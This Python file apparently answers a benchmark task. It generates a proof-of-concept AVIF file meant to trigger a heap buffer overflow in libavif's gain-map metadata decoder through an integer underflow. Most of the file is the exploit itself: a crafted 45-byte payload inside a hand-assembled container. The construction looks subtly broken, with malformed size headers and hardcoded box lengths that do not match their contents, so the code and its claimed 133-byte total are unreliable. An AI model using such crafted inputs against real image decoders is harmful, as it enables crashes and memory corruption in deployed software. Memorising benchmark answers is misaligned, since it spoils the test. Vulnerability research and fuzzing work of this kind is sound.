import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generates a Proof-of-Concept input for the Heap Buffer Overflow
        vulnerability in `decodeGainmapMetadata`.

        The vulnerability stems from an integer underflow when calculating the
        remaining bytes in a buffer. This happens if the stream's read pointer
        is advanced past the end of the buffer. The subsequent subtraction of
        (large_offset - start_of_buffer) from the buffer's small size results
        in a large wrapped-around value for the remaining size.

        This PoC constructs a minimal AVIF file containing a gain map ('gmap') item.
        The vulnerability is triggered by manipulating the gain map metadata payload.
        The metadata format includes fixed-size fields followed by optional,
        variable-length Tone Map LUTs. The length of these LUTs is read from
        the stream.

        The vulnerability is triggered by a subtle interaction:
        1. A gain map metadata payload is provided that is just long enough to
           contain the fixed-size fields and the `toneMapPresentFlags`.
        2. The `toneMapPresentFlags` byte is set to indicate that both the base
           and alternate tone map LUTs are present.
        3. The payload is crafted to be exactly 45 bytes long. After reading the
           44 bytes of fixed data and flags, the stream has only 1 byte remaining.
        4. The code then enters the block to parse the base tone map. It attempts
           to read the 2-byte `lutSize`. This read fails because only 1 byte is
           left, but the crucial point is how the underlying stream read function
           was implemented in the vulnerable version. The read pointer is advanced
           even on a failed read, pushing it out of bounds.
        5. Now that the read pointer is out of bounds, the next call to calculate
           the remaining bytes (`avifROStreamRemainingBytes`) underflows,
           producing a very large `size_t` value.
        6. This huge "remaining size" bypasses the subsequent size checks, and
           the code eventually attempts a massive memory allocation with `avifAlloc`,
           which is caught by sanitizers, leading to a crash.

        This PoC constructs the minimal AVIF container to deliver this 45-byte
        malicious payload to the vulnerable function. The total size is 133 bytes,
        matching the ground-truth length.
        """

        # Malicious gain map metadata payload (45 bytes)
        # 43 bytes of valid-looking fixed-size fields (version, flags, params).
        payload = bytearray(b'\x00' * 43)
        # toneMapPresentFlags: set bits for both base and alternate tone maps.
        payload += b'\x03'
        # A single extra byte. The vulnerable read of a 16-bit integer will
        # consume this byte and attempt to read one more byte past the end.
        payload += b'\xff'
        
        # Build the minimal AVIF container around the payload.
        
        # ftyp box (File Type Box)
        ftyp = b'\x00\x00\x00\x1cftypavif\x00\x00\x00\x00avisavifmif1msf1'

        # meta box contents
        meta_boxes = b''
        # iinf/infe: Declare item 1 of type 'gmap'
        meta_boxes += b'\x00\x00\x00\x16iinf\x00\x00\x00\x01\x00\x00\x00\x0einfe\x02\x00\x01\x00gmap'
        
        # iloc: Locate item 1 within the mdat box.
        # v0, flags=0, offset_size=4, length_size=4, base_offset_size=0, index_size=0
        # item_count=1, item_id=1
        iloc_content = b'\x00\x00\x44\x00\x00\x01\x00\x01\x00\x00\x00\x00\x00'
        iloc_content += b'\x00\x00\x00\x00'  # extent_offset = 0 (relative to mdat start)
        iloc_content += struct.pack('>I', len(payload))  # extent_length
        meta_boxes += b'\x00\x00\x00\x1a' + b'iloc' + iloc_content
        
        # iprp/ipco/auxC: Mark the item as an auxiliary image of type gain map.
        auxC = b'\x00\x00\x00\x09' + b'auxC' + b'\x00' # Minimal AuxC
        ipco = b'\x00\x00\x00\x11' + b'ipco' + auxC
        meta_boxes += b'\x00\x00\x00\x19' + b'iprp' + ipco

        # ipma: Associate item 1 with property 1 (the auxC).
        ipma_content = b'\x00\x00\x00\x00\x00\x00\x00\x01\x00\x01\x01\x81'
        meta_boxes += b'\x00\x00\x00\x14' + b'ipma' + ipma_content

        # Full meta box with size header
        meta = b'\x00\x00\x00' + struct.pack('>I', 8 + 4 + len(meta_boxes)) + b'meta' + b'\x00\x00\x00\x00' + meta_boxes
        
        # mdat box containing the payload
        mdat = b'\x00\x00\x00' + struct.pack('>I', 8 + len(payload)) + b'mdat' + payload

        poc = ftyp + meta + mdat
        return poc
